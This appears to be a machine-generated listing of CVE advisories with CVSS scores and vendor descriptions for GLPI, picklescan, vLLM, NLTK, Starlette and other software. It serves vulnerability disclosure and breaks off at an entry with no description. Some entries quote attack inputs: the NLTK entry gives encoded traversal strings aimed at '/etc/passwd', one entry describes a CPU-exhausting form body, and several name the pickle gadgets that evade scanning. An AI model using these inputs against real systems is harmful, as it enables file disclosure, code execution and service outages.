GLPI is a free asset and IT management software package. An authenticated user can exploit multiple SQL injection vulnerabilities. One of them can be used to alter another user account data and take control of it. Upgrade to 10.0.17.

### CVE-2024-37148

| 項目 | 値 |
|------|-----|
| CVSS | `8.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |
| Weaknesses | `CWE-89` |
| Published | 2024-07-10T19:18:09.444Z |

GLPI is an open-source asset and IT management software package that provides ITIL Service Desk features, licenses tracking and software auditing. An authenticated user can exploit a SQL injection vulnerability in some AJAX scripts to alter another user account data and take control of it. Upgrade to 10.0.16.

### CVE-2023-35628

| 項目 | 値 |
|------|-----|
| CVSS | `8.1` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:O/RC:C` |
| Weaknesses | `CWE-416` |
| Published | 2023-12-12T18:10:51.539Z |

Windows MSHTML Platform Remote Code Execution Vulnerability

### CVE-2023-41326

| 項目 | 値 |
|------|-----|
| CVSS | `8.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |
| Weaknesses | `CWE-269` |
| Published | 2023-09-26T22:40:49.778Z |

GLPI stands for Gestionnaire Libre de Parc Informatique is a Free Asset and IT Management Software package, that provides ITIL Service Desk features, licenses tracking and software auditing. A logged user from any profile can hijack the Kanban feature to alter any user field, and end-up with stealing its account. Users are advised to upgrade to version 10.0.10. There are no known workarounds for this vulnerability.

### CVE-2023-41320

| 項目 | 値 |
|------|-----|
| CVSS | `8.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |
| Weaknesses | `CWE-89` |
| Published | 2023-09-26T21:15:39.479Z |

GLPI stands for Gestionnaire Libre de Parc Informatique is a Free Asset and IT Management Software package, that provides ITIL Service Desk features, licenses tracking and software auditing. UI layout preferences management can be hijacked to lead to SQL injection. This injection can be use to takeover an administrator account. Users are advised to upgrade to version 10.0.10. There are no known workarounds for this vulnerability.

### CVE-2022-22241

| 項目 | 値 |
|------|-----|
| CVSS | `8.1` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-20` |
| Published | 2022-10-18T02:46:43.500Z |

An Improper Input Validation vulnerability in the J-Web component of Juniper Networks Junos OS may allow an unauthenticated attacker to access data without proper authorization. Utilizing a crafted POST request, deserialization may occur which could lead to unauthorized local file access or the ability to execute arbitrary commands. This issue affects Juniper Networks Junos OS: all versions prior to 19.1R3-S9; 19.2 versions prior to 19.2R3-S6; 19.3 versions prior to 19.3R3-S7; 19.4 versions prior to 19.4R2-S7, 19.4R3-S9; 20.1 versions prior to 20.1R3-S5; 20.2 versions prior to 20.2R3-S5; 20.3 versions prior to 20.3R3-S5; 20.4 versions prior to 20.4R3-S4; 21.1 versions prior to 21.1R3-S2; 21.2 versions prior to 21.2R3-S1; 21.3 versions prior to 21.3R2-S2, 21.3R3; 21.4 versions prior to 21.4R1-S2, 21.4R2-S1, 21.4R3; 22.1 versions prior to 22.1R1-S1, 22.1R2.

### CVE-2021-23758

| 項目 | 値 |
|------|-----|
| CVSS | `8.1` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `N/A` |
| Published | 2021-12-03T20:05:12.932Z |

All versions of package ajaxpro.2 are vulnerable to Deserialization of Untrusted Data due to the possibility of deserialization of arbitrary .NET classes, which can be abused to gain remote code execution.

### CVE-2023-47565

| 項目 | 値 |
|------|-----|
| CVSS | `8.0` |
| Vector | `CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2023-12-08T16:06:29.861Z |

An OS command injection vulnerability has been found to affect legacy QNAP VioStor NVR models running QVR Firmware 4.x. If exploited, the vulnerability could allow authenticated users to execute commands via a network.

We have already fixed the vulnerability in the following versions:

QVR Firmware 5.0.0 and later

### CVE-2023-46214

| 項目 | 値 |
|------|-----|
| CVSS | `8.0` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-91` |
| Published | 2023-11-16T20:15:25.838Z |

In Splunk Enterprise versions below 9.0.7 and 9.1.2, Splunk Enterprise does not safely sanitize extensible stylesheet language transformations (XSLT) that users supply. This means that an attacker can upload malicious XSLT which can result in remote code execution on the Splunk Enterprise instance.

### CVE-2019-11539

| 項目 | 値 |
|------|-----|
| CVSS | `8.0` |
| Vector | `CVSS:3.0/AC:H/AV:N/A:H/C:H/I:H/PR:H/S:C/UI:N` |
| Weaknesses | `N/A` |
| Published | 2019-04-26T01:39:36.000Z |

In Pulse Secure Pulse Connect Secure version 9.0RX before 9.0R3.4, 8.3RX before 8.3R7.1, 8.2RX before 8.2R12.1, and 8.1RX before 8.1R15.1 and Pulse Policy Secure version 9.0RX before 9.0R3.2, 5.4RX before 5.4R7.1, 5.3RX before 5.3R12.1, 5.2RX before 5.2R12.1, and 5.1RX before 5.1R15.1, the admin web interface allows an authenticated attacker to inject and execute commands.

### CVE-2026-44274

| 項目 | 値 |
|------|-----|
| CVSS | `7.8` |
| Vector | `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-59` |
| Published | 2026-06-22T20:16:29.467 |

Dell Wyse Management Suite (WMS), versions prior to WMS 2605, contain an Improper Link Resolution Before File Access vulnerability. A low privileged attacker with local access could potentially exploit this vulnerability, leading to Unauthorized access.

### CVE-2022-44666

| 項目 | 値 |
|------|-----|
| CVSS | `7.8` |
| Vector | `CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H/E:U/RL:O/RC:C` |
| Weaknesses | `N/A` |
| Published | 2022-12-13T00:00:00.000Z |

Windows Contacts Remote Code Execution Vulnerability

### CVE-2022-30190

| 項目 | 値 |
|------|-----|
| CVSS | `7.8` |
| Vector | `CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C` |
| Weaknesses | `N/A` |
| Published | 2022-06-01T20:10:17.000Z |

A remote code execution vulnerability exists when MSDT is called using the URL protocol from a calling application such as Word. An attacker who successfully exploits this vulnerability can run arbitrary code with the privileges of the calling application. The attacker can then install programs, view, change, or delete data, or create new accounts in the context allowed by the user’s rights.
Please see the MSRC Blog Entry for important information about steps you can take to protect your system from this vulnerability.

### CVE-2021-27065

| 項目 | 値 |
|------|-----|
| CVSS | `7.8` |
| Vector | `CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H/E:F/RL:O/RC:C` |
| Weaknesses | `N/A` |
| Published | 2021-03-02T23:55:28.000Z |

Microsoft Exchange Server Remote Code Execution Vulnerability

### CVE-2018-16858

| 項目 | 値 |
|------|-----|
| CVSS | `7.8` |
| Vector | `CVSS:3.0/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-356` |
| Published | 2019-03-25T17:43:08.000Z |

It was found that libreoffice before versions 6.0.7 and 6.1.3 was vulnerable to a directory traversal attack which could be used to execute arbitrary macros bundled with a document. An attacker could craft a document, which when opened by LibreOffice, would execute a Python method from a script in any arbitrary file system location, specified relative to the LibreOffice install location.

### CVE-2025-0626

| 項目 | 値 |
|------|-----|
| CVSS | `7.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-912` |
| Published | 2025-01-30T18:17:29.717Z |

The "monitor" binary in the firmware of the affected product attempts to mount to a hard-coded, routable IP address, bypassing existing device network settings to do so. The function also enables the network interface of the device if it is disabled. The function is triggered by attempting to update the device from the user menu. This could serve as a backdoor to the device, and could lead to a malicious actor being able to upload and overwrite files on the device.

### CVE-2025-0107

| 項目 | 値 |
|------|-----|
| CVSS | `7.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:L/SC:H/SI:N/SA:N/AU:N/R:U/V:C/RE:H/U:Green` |
| Weaknesses | `CWE-78` |
| Published | 2025-01-11T03:02:49.517Z |

An OS command injection vulnerability in Palo Alto Networks Expedition enables an unauthenticated attacker to run arbitrary OS commands as the www-data user in Expedition, which results in the disclosure of usernames, cleartext passwords, device configurations, and device API keys for firewalls running PAN-OS software.

### CVE-2024-31456

| 項目 | 値 |
|------|-----|
| CVSS | `7.7` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` |
| Weaknesses | `CWE-89` |
| Published | 2024-05-07T14:07:08.277Z |

GLPI is a Free Asset and IT Management Software package. Prior to 10.0.15, an authenticated user can exploit a SQL injection vulnerability from map search. This vulnerability is fixed in 10.0.15.

### CVE-2024-27096

| 項目 | 値 |
|------|-----|
| CVSS | `7.7` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` |
| Weaknesses | `CWE-89` |
| Published | 2024-03-18T16:11:08.100Z |

GLPI is a Free Asset and IT Management Software package, Data center management, ITIL Service Desk, licenses tracking and software auditing. An authenticated user can exploit a SQL injection vulnerability in the search engine to extract data from the database. This issue has been patched in version 10.0.13.

### CVE-2018-5430

| 項目 | 値 |
|------|-----|
| CVSS | `7.7` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` |
| Weaknesses | `N/A` |
| Published | 2018-04-17T18:00:00.000Z |

The Spring web flows of TIBCO Software Inc.'s TIBCO JasperReports Server, TIBCO JasperReports Server Community Edition, TIBCO JasperReports Server for ActiveMatrix BPM, TIBCO Jaspersoft for AWS with Multi-Tenancy, and TIBCO Jaspersoft Reporting and Analytics for AWS contain a vulnerability which may allow any authenticated user read-only access to the contents of the web application, including key configuration files. Affected releases include TIBCO Software Inc.'s TIBCO JasperReports Server: versions up to and including 6.2.4; 6.3.0; 6.3.2; 6.3.3;6.4.0; 6.4.2, TIBCO JasperReports Server Community Edition: versions up to and including 6.4.2, TIBCO JasperReports Server for ActiveMatrix BPM: versions up to and including 6.4.2, TIBCO Jaspersoft for AWS with Multi-Tenancy: versions up to and including 6.4.2, TIBCO Jaspersoft Reporting and Analytics for AWS: versions up to and including 6.4.2.

### CVE-2025-71376

| 項目 | 値 |
|------|-----|
| CVSS | `7.6` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-502` |
| Published | 2026-06-23T13:16:38.870 |

picklescan before 0.0.29 fails to detect malicious pickle files using idlelib.autocomplete.AutoComplete.fetch_completions in reduce methods. Attackers can embed undetected code in pickle files that executes arbitrary commands when loaded by victims.

### CVE-2025-71370

| 項目 | 値 |
|------|-----|
| CVSS | `7.6` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-502` |
| Published | 2026-06-23T13:16:38.743 |

picklescan before 0.0.28 fails to detect malicious torch.jit.unsupported_tensor_ops.execWrapper function calls embedded in pickle files. Attackers can craft malicious pickle files that bypass picklescan detection and execute arbitrary code when loaded via pickle.load().

### CVE-2025-71365

| 項目 | 値 |
|------|-----|
| CVSS | `7.6` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-502` |
| Published | 2026-06-23T13:16:38.617 |

picklescan before 0.0.33 fails to detect malicious pickle files that invoke numpy.f2py.crackfortran.myeval function through the reduce method. Attackers can craft malicious pickle files embedding arbitrary code that evades picklescan detection and executes remote code when loaded.

### CVE-2025-71341

| 項目 | 値 |
|------|-----|
| CVSS | `7.6` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-502` |
| Published | 2026-06-23T13:16:38.370 |

picklescan before 0.0.29 fails to detect the profile.Profile.runctx function when analyzing pickle files, allowing attackers to embed undetected malicious code. Remote attackers can craft malicious pickle files using profile.Profile.runctx in the reduce method to achieve remote code execution when the pickle file is loaded.

### CVE-2026-55409

| 項目 | 値 |
|------|-----|
| CVSS | `7.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N` |
| Weaknesses | `CWE-79` |
| Published | 2026-06-22T22:16:50.533 |

Filament is a collection of full-stack components for accelerated Laravel development. From 3.0.0 until 3.3.53, a disabled RichEditor field rendered its raw state without sanitizing HTML. Where the data stored in this field's state isn't sanitized already when the form state was filled, an attacker could plant malicious HTML or JavaScript and achieve XSS that executes for users who view the form. This vulnerability is fixed in 3.3.53.

### CVE-2025-71358

| 項目 | 値 |
|------|-----|
| CVSS | `7.6` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-502` |
| Published | 2026-06-22T22:16:45.360 |

picklescan before 0.0.29 fails to detect malicious pickle files that exploit idlelib.autocomplete.AutoComplete.get_entity function in reduce methods. Attackers can embed undetected code in pickle files that executes arbitrary commands when loaded by victims using pickle.load().

### CVE-2025-71344

| 項目 | 値 |
|------|-----|
| CVSS | `7.6` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-502` |
| Published | 2026-06-22T22:16:45.220 |

picklescan before 0.0.30 (affected versions 0.0.26 and earlier) fails to detect the ensurepip._run_pip built-in function when scanning pickle files, allowing attackers to execute arbitrary code. Malicious pickle files embedding ensurepip._run_pip calls in __reduce__ methods bypass picklescan detection and achieve remote code execution upon pickle.load() invocation.

### CVE-2025-71339

| 項目 | 値 |
|------|-----|
| CVSS | `7.6` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-502` |
| Published | 2026-06-22T22:16:45.053 |

Picklescan before 0.0.33 fails to detect the numpy.f2py.crackfortran._eval_length gadget in pickle __reduce__ methods, allowing arbitrary code execution. Attackers can craft malicious pickle files that execute arbitrary Python code when loaded by victims who trust Picklescan's safety validation.

### CVE-2025-4123

| 項目 | 値 |
|------|-----|
| CVSS | `7.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:L` |
| Weaknesses | `CWE-79;CWE-601` |
| Published | 2025-05-22T07:44:09.491Z |

A cross-site scripting (XSS) vulnerability exists in Grafana caused by combining a client path traversal and open redirect. This allows attackers to redirect users to a website that hosts a frontend plugin that will execute arbitrary JavaScript. This vulnerability does not require editor permissions and if anonymous access is enabled, the XSS will work. If the Grafana Image Renderer plugin is installed, it is possible to exploit the open redirect to achieve a full read SSRF.

The default Content-Security-Policy (CSP) in Grafana will block the XSS though the `connect-src` directive.

### CVE-2023-5044

| 項目 | 値 |
|------|-----|
| CVSS | `7.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L` |
| Weaknesses | `CWE-20` |
| Published | 2023-10-25T19:19:08.139Z |

Code injection via nginx.ingress.kubernetes.io/permanent-redirect annotation.

### CVE-2021-32706

| 項目 | 値 |
|------|-----|
| CVSS | `7.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:H` |
| Weaknesses | `CWE-94` |
| Published | 2021-08-04T17:50:09.000Z |

Pi-hole's Web interface provides a central location to manage a Pi-hole instance and review performance statistics. Prior to Pi-hole Web interface version 5.5.1, the `validDomainWildcard` preg_match filter allows a malicious character through that can be used to execute code, list directories, and overwrite sensitive files. The issue lies in the fact that one of the periods is not escaped, allowing any character to be used in its place. A patch for this vulnerability was released in version 5.5.1.

### CVE-2021-22123

| 項目 | 値 |
|------|-----|
| CVSS | `7.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:H` |
| Weaknesses | `N/A` |
| Published | 2021-06-01T19:58:35.000Z |

An OS command injection vulnerability in FortiWeb's management interface 6.3.7 and below, 6.2.3 and below, 6.1.x, 6.0.x, 5.9.x may allow a remote authenticated attacker to execute arbitrary commands on the system via the SAML server configuration page.

### CVE-2026-8379

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `N/A` |
| Published | 2026-06-23T07:16:21.203 |

The Frontend File Manager Plugin WordPress plugin through 23.6 does not properly enforce its nonce check on the file download handler, allowing unauthenticated attackers to download files uploaded by any user through the Frontend File Manager Plugin WordPress plugin through 23.6 by iterating identifiers.

### CVE-2026-41523

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-94;CWE-617` |
| Published | 2026-06-22T23:16:30.200 |

vLLM is an inference and serving engine for large language models (LLMs). Prior to 0.22.0, an assert-based security check in vLLM's activation function loading allows any unauthenticated attacker to achieve arbitrary code execution on the server by publishing a malicious HuggingFace model, when vLLM runs in Python optimized mode (python -O or PYTHONOPTIMIZE=1). This vulnerability is fixed in 0.22.0.

### CVE-2026-48506

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-674` |
| Published | 2026-06-22T22:16:47.437 |

MessagePack for C# is a MessagePack serializer for C#. Prior to 2.5.301 and 3.1.7, MessagePackReader.TrySkip() recursively descends into nested arrays and maps without incrementing the reader depth or calling the configured depth checks. This bypasses MessagePackSecurity.MaximumObjectGraphDepth, the library's documented protection against deeply nested object graphs. Many generated and dynamic formatters call reader.Skip() when they encounter unknown map keys, unknown array members, ignored fields, or data that should be skipped for forward compatibility. A deeply nested value in one of these skipped positions can therefore cause unbounded recursion and an uncatchable StackOverflowException. This vulnerability is fixed in 2.5.301 and 3.1.7.

### CVE-2026-55603

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:H/A:N` |
| Weaknesses | `CWE-93` |
| Published | 2026-06-22T21:16:26.033 |

http-proxy-middleware is node.js http-proxy middleware. From 3.0.4 until 3.0.7 and 4.1.1, fixRequestBody() is the library's documented helper for re-emitting a request body that was already consumed by a body parser. When the outgoing Content-Type is multipart/form-data, it rebuilds the body with handlerFormDataBodyData(), which interpolates each req.body key and value directly into the multipart wire format without neutralizing CR/LF. A \r\n inside a value (or key) lets an attacker close the current part and inject an entirely new form part. Because the proxy's own body parser saw a single opaque value, any gateway-side policy or validation performed on req.body is evaluated against a different set of fields than the upstream backend ultimately parses a request/parameter desynchronization across the trust boundary. This vulnerability is fixed in 3.0.7 and 4.1.1.

### CVE-2026-54299

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:N` |
| Weaknesses | `CWE-20;CWE-918` |
| Published | 2026-06-22T19:17:21.260 |

Astro is a web framework. Prior to 6.4.6, Astro SSR apps with prerendered error pages (/404 or /500 using export const prerender = true) fetch those pages over HTTP at runtime when an error occurs. The URL for this fetch is derived from request.url, which in turn gets its origin from the incoming Host header. When the Host header is not validated against allowedDomains, an attacker can point the fetch at an arbitrary host and read the response. This vulnerability is fixed in 6.4.6.

### CVE-2026-54293

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `CWE-22` |
| Published | 2026-06-22T19:17:20.983 |

NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. Prior to 3.10.0-rc1, nltk.data.load() in NLTK is vulnerable to path traversal via URL-encoded path separators and traversal segments when using the nltk: URL scheme. The unsafe-path regex check is performed before url2pathname() decodes the %xx sequences (a classic decode-after-check / TOCTOU-style flaw), allowing an attacker to bypass the protection documented in NLTK's SECURITY.md and read arbitrary files from the filesystem. While literal traversal strings such as ../../../etc/passwd are correctly blocked, encoded variants such as %2fetc%2fpasswd, %2e%2e%2f..., and ..%2f..%2f slip past the regex and are subsequently decoded into a real filesystem path. This vulnerability is fixed in 3.10.0-rc1.

### CVE-2026-54283

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-770` |
| Published | 2026-06-22T18:16:46.943 |

Starlette is a lightweight ASGI framework/toolkit. From 0.4.1 until 1.3.1, request.form() accepts max_fields and max_part_size to bound resource consumption while parsing form data. These limits are enforced for multipart/form-data, but silently ignored for application/x-www-form-urlencoded. An unauthenticated attacker can therefore send a urlencoded body with an arbitrarily large number of fields or an arbitrarily large field, even when the application configured limits it believed would apply. This vulnerability is fixed in 1.3.1.

### CVE-2026-53539

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-400;CWE-407` |
| Published | 2026-06-22T18:16:44.360 |

Python-Multipart is a streaming multipart parser for Python. Prior to 0.0.30, when parsing application/x-www-form-urlencoded bodies, QuerystringParser located the field separator with a two step lookup: it first scanned the entire remaining buffer for &, and only when no & existed anywhere ahead did it fall back to scanning for ;. For a body that uses ; as the separator and contains no &, every field iteration performed a full failed & scan over the entire remaining buffer before locating the nearby ;. With N semicolon separated fields in a chunk of size B, this yields O(B^2) byte comparisons per chunk. An attacker can submit a small crafted body of the form a;a;a;... and cause the parser to spend seconds of CPU per request. A handful of concurrent requests can exhaust worker processes. This vulnerability is fixed in 0.0.30.

### CVE-2026-48712

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-674` |
| Published | 2026-06-22T18:16:39.640 |

protobufjs compiles protobuf definitions into JavaScript (JS) functions. Prior to 7.6.1 and 8.4.1, protobufjs could recurse without a depth limit while converting decoded messages to plain objects or JSON. This affected generated toObject() conversion and the custom google.protobuf.Any JSON conversion path. A crafted protobuf binary payload containing deeply nested Any values could cause the JavaScript call stack to be exhausted during conversion to JSON. This vulnerability is fixed in 7.6.1 and 8.4.1.

### CVE-2026-42127

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-770` |
| Published | 2026-06-22T18:16:37.430 |

The public dashboard query endpoint does not limit request body size before processing, allowing unauthenticated attackers to trigger excessive memory allocation by sending arbitrarily large JSON payloads. This can lead to denial of service through memory exhaustion. No valid dashboard access token or authentication is required to exploit this vulnerability.

### CVE-2026-9071

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-400` |
| Published | 2026-06-22T16:16:43.357 |

IBM WebSphere Application Server 9.0, and 8.5 and IBM WebSphere Application Server - Liberty 17.0.0.3 through 26.0.0.6 are vulnerable to a denial of service, caused by sending a specially-crafted request. A remote attacker could exploit this vulnerability to cause the server to consume memory resources.

### CVE-2026-8858

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-94` |
| Published | 2026-06-22T16:16:42.967 |

IBM i 7.6, 7.5, 7.4, and 7.3, IBM WebSphere Application Server and IBM WebSphere Application Server Liberty are vulnerable to remote code execution and denial of service in the WebSphere Web Server Plug-in component. This vulnerability can be exploited when an attacker impersonates the application server and sends crafted responses to the plug-in.

### CVE-2025-13087

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:4.0/AV:N/AC:H/AT:N/PR:H/UI:N/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-78` |
| Published | 2025-11-20T21:32:37.510Z |

A vulnerability exists in the Opto22 Groov Manage REST API on GRV-EPIC and groov RIO Products that allows remote code execution with root privileges. When a POST request is executed against the vulnerable endpoint, the application reads certain header details and unsafely uses these values to build commands, allowing an attacker with administrative privileges to inject arbitrary commands that execute as root.

### CVE-2025-32786

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `CWE-89` |
| Published | 2025-11-04T20:18:43.581Z |

The GLPI Inventory Plugin handles network discovery, inventory, software deployment, and data collection for GLPI agents. Versions 1.5.0 and below are vulnerable to SQL Injection. This issue is fixed in version 1.5.1.

### CVE-2025-58180

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:4.0/AV:A/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-78` |
| Published | 2025-09-09T19:34:14.765Z |

OctoPrint provides a web interface for controlling consumer 3D printers. OctoPrint versions up until and including 1.11.2 contain a vulnerability that allows an authenticated attacker to upload a file under a specially crafted filename that will allow arbitrary command execution if said filename becomes included in a command defined in a system event handler and said event gets triggered. If no event handlers executing system commands with uploaded filenames as parameters have been configured, this vulnerability does not have an impact. The vulnerability is patched in version 1.11.3. As a workaround, OctoPrint administrators who have event handlers configured that include any kind of filename based placeholders should disable those by setting their `enabled` property to `False` or unchecking the "Enabled" checkbox in the GUI based Event Manager. Alternatively, OctoPrint administrators should set `feature.enforceReallyUniversalFilenames` to `true` in `config.yaml` and restart OctoPrint, then vet the existing uploads and make sure to delete any suspicious looking files. As always, OctoPrint administrators are advised to not expose OctoPrint on hostile networks like the public internet, and to vet who has access to their instance.

### CVE-2025-25231

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `N/A` |
| Published | 2025-08-11T18:12:49.711Z |

Omnissa Workspace ONE UEM contains a Secondary Context Path Traversal Vulnerability. A malicious actor may be able to gain access to sensitive information by sending crafted GET requests (read-only) to restricted API endpoints.

### CVE-2025-36520

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-476` |
| Published | 2025-07-22T15:26:34.557Z |

A null pointer dereference vulnerability exists in the net_connectmsg Protocol Buffer Message functionality of Bloomberg Comdb2 8.1. A specially crafted network packets can lead to a denial of service. An attacker can send packets to trigger this vulnerability.

### CVE-2025-46354

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-617` |
| Published | 2025-07-22T15:26:32.910Z |

A denial of service vulnerability exists in the Distributed Transaction Commit/Abort Operation functionality of Bloomberg Comdb2 8.1. A specially crafted network packet can lead to a denial of service. An attacker can send a malicious packet to trigger this vulnerability.

### CVE-2025-34509

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `CWE-798` |
